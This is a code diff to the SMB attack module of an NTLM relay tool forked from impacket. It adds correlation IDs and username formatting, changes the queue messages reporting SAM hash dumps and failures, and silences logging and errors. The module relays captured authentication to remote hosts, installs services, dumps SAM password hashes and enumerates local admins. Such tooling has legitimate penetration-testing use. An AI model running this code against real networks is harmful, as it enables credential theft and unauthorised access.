@@ -35,10 +35,21 @@ class SMBAttack(ProtocolAttack):
     shell if the -i option is specified.
     """
     PLUGIN_NAMES = ["SMB"]
-    ERROR = {'poisoner': 'ntlmrelayx', 'action_state': ['error']}
-    def __init__(self, config, SMBClient, username, source_host=None):
-        self.username = username
+    def __init__(self, config, SMBClient, username, source_host=None, corr_id=None, domain=None):
+        # store username and format
+        self.auth_username = username.lower()
+        if domain and '\\' not in self.auth_username:
+            # smbrelayserver formats username like <domain>/<user>
+            # we want to standardize this to one format similar to Responders
+            if '/' in self.auth_username:
+                self.auth_username = self.auth_username.split('/')[1]
+            elif '\\' in self.auth_username:
+                self.auth_username = self.auth_username.split('\\')[1]
+            self.auth_username = domain + '\\' + self.auth_username
+        #track the host
         self.source_host = source_host
+        #track the correlation id in order to pair it with the hash used for attack
+        self.correlation_id = corr_id
         ProtocolAttack.__init__(self, config, SMBClient, username)
         if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
             self.__SMBConnection = SMBConnection(existingConnection=SMBClient)
@@ -58,6 +69,10 @@ class SMBAttack(ProtocolAttack):
 
     def run(self):
         ntlmrelayx_q = self.config.ntlmrelayx_q
+        if self.__SMBConnection.getRemoteHost() == '127.0.0.1':
+            # for when no relaying is on or no targets in targets file
+            # static set in httprelayserver for this scenario to still capture hash like responder
+            return
         # Here PUT YOUR CODE!
         if self.tcpshell is not None:
             LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)
@@ -69,7 +84,7 @@ class SMBAttack(ProtocolAttack):
         if self.config.exeFile is not None:
             result = self.installService.install()
             if result is True:
-                LOG.info("Service Installed.. CONNECT!")
+                #LOG.info("Service Installed.. CONNECT!")
                 self.installService.uninstall()
         else:
             from horizon3_impacket.impacket.examples.secretsdump import RemoteOperations, SAMHashes
@@ -87,22 +102,45 @@ class SMBAttack(ProtocolAttack):
                 remoteOps.enableRegistry()
             except Exception as e:
                 if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
+                    # currently not enumerating local admins - just return failed secretsdump message
+                    if ntlmrelayx_q != None:
+                        target_host = self.__SMBConnection.getRemoteHost()
+                        timenow = datetime.now(timezone.utc).timestamp()
+                        if self.auth_username == '':
+                            user = 'guest'
+                        else:
+                            user = self.auth_username
+
+                        msg = {'poisoner': 'ntlmrelayx',
+                               'target': target_host,
+                               'timestamp': timenow,
+                               'user': user,
+                               'action_state': 'secretsdump_fail',
+                               'data':
+                                   {
+                                       'module': 'SMB',
+                                       'source_host': self.source_host,
+                                       'corr_id': self.correlation_id,
+                                       'error_msg': str(e)
+                                   }
+                               }
+                        ntlmrelayx_q.put(msg)
+
                     if self.config.enumLocalAdmins:
-                        LOG.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
+                        #LOG.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
                         enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
                         try:
                             localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
-                            LOG.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
+                            #LOG.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
                             for name in localAdminNames:
-                                LOG.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))
+                                pass
+                                #LOG.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))
                         except DCERPCException:
-                            LOG.info("SAMR access denied")
+                            pass
+                            #LOG.info("SAMR access denied")
                         return
                 # Something else went wrong. aborting
-                if ntlmrelayx_q != None:
-                    SMBAttack.ERROR['data'] = str(e)
-                    ntlmrelayx_q.extend([SMBAttack.ERROR])
-                LOG.error(str(e))
+                #LOG.error(str(e))
                 return
 
             try:
@@ -125,21 +163,29 @@ class SMBAttack(ProtocolAttack):
                         cwd = os.getcwd()
                         file_name = target_host + '_samhashes.sam'
                         file_path = os.path.join(cwd, file_name)
-                        if self.username == '':
+                        if self.auth_username == '':
                             user = 'guest'
                         else:
-                            user = self.username
+                            user = self.auth_username
 
-                        msg = {'poisoner': 'ntlmrelayx', 'target': target_host, 'username': user, 'timestamp': timenow,
-                         'action_state': ['secretsdump'], 'data': {'samHashFilename': file_path, 'source_host': self.source_host}}
-                        ntlmrelayx_q.extend([msg])
+                        msg = {'poisoner': 'ntlmrelayx',
+                               'target': target_host,
+                               'timestamp': timenow,
+                               'user': user,
+                               'action_state': 'secretsdump',
+                               'data':
+                                   {'module': 'SMB',
+                                    'sam_hash_filename': file_path,
+                                    'source_host': self.source_host,
+                                    'corr_id': self.correlation_id
+                                    }
+                               }
+                        ntlmrelayx_q.put(msg)
 
                     #LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
             except Exception as e:
-                if ntlmrelayx_q != None:
-                    SMBAttack.ERROR['data'] = str(e)
-                    ntlmrelayx_q.extend([SMBAttack.ERROR])
-                LOG.error(str(e))
+                pass
+                #LOG.error(str(e))
             finally:
                 if samHashes is not None:
                     samHashes.finish()
